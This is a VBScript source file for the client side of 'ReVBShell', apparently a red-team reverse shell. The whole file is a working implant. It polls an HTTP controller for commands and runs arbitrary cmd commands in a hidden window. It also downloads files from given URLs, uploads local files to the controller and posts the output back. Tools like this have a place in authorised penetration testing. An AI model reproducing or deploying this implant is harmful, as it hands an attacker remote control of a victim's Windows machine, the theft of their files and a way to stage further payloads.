' This software is provided under under the BSD 3-Clause License.
' See the accompanying LICENSE file for more information.
'
' Client for Reverse VBS Shell
'
' Author:
'  Arris Huijgen
'
' Website:
'  https://github.com/bitsadmin/ReVBShell
'

Option Explicit
On Error Resume Next

' Instantiate objects
Dim shell: Set shell = CreateObject("WScript.Shell")
Dim fs: Set fs = CreateObject("Scripting.FileSystemObject")
Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")

' Initialize variables used by GET/WGET
Dim arrSplitUrl, strFilename, stream

' Configuration
Dim strHost, strPort, strUrl, intSleep
strHost = "127.0.0.1"
strPort = "8080"
intSleep = 5000
strUrl = "http://" & strHost & ":" & strPort

' Periodically poll for commands
While True
    ' Fetch next command
    http.Open "GET", strUrl & "/", False
    http.Send
    Dim strRawCommand
    strRawCommand = http.ResponseText

    ' Determine command and arguments
    Dim arrResponseText, strCommand, strArgument
    arrResponseText = Split(strRawCommand, " ", 2)
    strCommand = arrResponseText(0)
    strArgument = ""
    If UBound(arrResponseText) > 0 Then
        strArgument = arrResponseText(1)
    End If

    ' Execute command
    Select Case strCommand
        ' Sleep X seconds
        Case "NOOP"
            WScript.Sleep intSleep
        
        ' Set sleep time
        Case "SLEEP"
            If strArgument <> "" Then
                intSleep = CInt(strArgument)
                SendStatusUpdate strRawCommand, "Sleep set to " & strArgument & "ms"
            Else
                Dim strSleep
                strSleep = CStr(intSleep)
                SendStatusUpdate strRawCommand, "Sleep is currently set to " & strSleep & "ms"
                strSleep = Empty
            End If
        
        ' Execute command
        Case "SHELL"
            'Execute and write to file
            Dim strOutFile: strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
            shell.Run "cmd /C " & strArgument & "> """ & strOutFile & """ 2>&1", 0, True

            ' Read out file
            Dim file: Set file = fs.OpenTextFile(strOutfile, 1)
            Dim text
            If Not file.AtEndOfStream Then
                text = file.ReadAll
            Else
                text = "[empty result]"
            End If
            file.Close
            fs.DeleteFile strOutFile, True

            ' Set response
            SendStatusUpdate strRawCommand, text

            ' Clean up
            strOutFile = Empty
            text = Empty

        ' Download a file from a URL
        Case "WGET"
            ' Determine filename
            arrSplitUrl = Split(strArgument, "/")
            strFilename = arrSplitUrl(UBound(arrSplitUrl))

            ' Fetch file
            Err.Clear() ' Set error number to 0
            http.Open "GET", strArgument, False
            http.Send

            If Err.number <> 0 Then
                SendStatusUpdate strRawCommand, "Error when downloading from " & strArgument & ": " & Err.Description
            Else
                ' Write to file
                Set stream = createobject("Adodb.Stream")
                With stream
                    .Type = 1 'adTypeBinary
                    .Open
                    .Write http.ResponseBody
                    .SaveToFile strFilename, 2 'adSaveCreateOverWrite
                End With

                ' Set response
                SendStatusUpdate strRawCommand, "File download from " & strArgument & " successful."
            End If

            ' Clean up
            arrSplitUrl = Array()
            strFilename = Empty

        Case "GET"
            ' Only download if file exists
            If fs.FileExists(strArgument) Then
                ' Determine filename
                arrSplitUrl = Split(strArgument, "\")
                strFilename = arrSplitUrl(UBound(arrSplitUrl))

                ' Read the file to memory
                Set stream = CreateObject("Adodb.Stream")
                stream.Type = 1 ' adTypeBinary
                stream.Open
                stream.LoadFromFile strArgument
                Dim binFileContents
                binFileContents = stream.Read

                ' Upload file
                DoHttpBinaryPost "upload", strRawCommand, strFilename, binFileContents

                ' Clean up
                binFileContents = Empty
            Else
                SendStatusUpdate strRawCommand, "File does not exist: " & strArgument
            End If

            ' Clean up
            arrSplitUrl = Array()
            strFilename = Empty

        Case "KILL"
            SendStatusUpdate strRawCommand, "Goodbye!"
            WScript.Quit 0

        Case Else
            SendStatusUpdate strRawCommand, "Unknown command"
    End Select

    ' Clean up
    strRawCommand = Empty
    arrResponseText = Array()
    strCommand = Empty
    strArgument = Empty
Wend


Function SendStatusUpdate(strText, strData)
    Dim binData
    binData = StringToBinary(strData)
    DoHttpBinaryPost "cmd", strText, "cmdoutput", binData
End Function


Function DoHttpBinaryPost(strActionType, strText, strFilename, binData)
    ' Compile POST headers and footers
    Const strBoundary = "----WebKitFormBoundaryNiV6OvjHXJPrEdnb"
    Dim binTextHeader, binText, binDataHeader, binFooter, binConcatenated
    binTextHeader = StringToBinary("--" & strBoundary & vbCrLf & _
                                   "Content-Disposition: form-data; name=""cmd""" & vbCrLf & vbCrLf)
    binDataHeader = StringToBinary(vbCrLf & _
                                   "--" & strBoundary & vbCrLf & _
                                   "Content-Disposition: form-data; name=""result""; filename=""" & strFilename & """" & vbCrLf & _
                                   "Content-Type: application/octet-stream" & vbCrLf & vbCrLf)
    binFooter = StringToBinary(vbCrLf & "--" & strBoundary & "--" & vbCrLf)

    ' Convert command to binary
    binText = StringToBinary(strText)

    ' Concatenate POST headers, data elements and footer
    Dim stream : Set stream = CreateObject("Adodb.Stream")
    stream.Open
    stream.Type = 1 ' adTypeBinary
    stream.Write binTextHeader
    stream.Write binText
    stream.Write binDataHeader
    stream.Write binData
    stream.Write binFooter
    stream.Position = 0
    binConcatenated = stream.Read(stream.Size)

    ' Post data
    http.Open "POST", strUrl & "/" & strActionType, False
    http.SetRequestHeader "Content-Length", LenB(binConcatenated)
    http.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & strBoundary
    http.SetTimeouts 5000, 60000, 60000, 60000
    http.Send binConcatenated
    
    ' Receive response
    DoHttpBinaryPost = http.ResponseText
End Function


Function StringToBinary(Text)
    Dim stream: Set stream = CreateObject("Adodb.Stream")
    stream.Type = 2 'adTypeText
    stream.CharSet = "us-ascii"

    ' Store text in stream
    stream.Open
    stream.WriteText Text

    ' Change stream type To binary
    stream.Position = 0
    stream.Type = 1 'adTypeBinary
  
    ' Return binary data
    StringToBinary = stream.Read
End Function
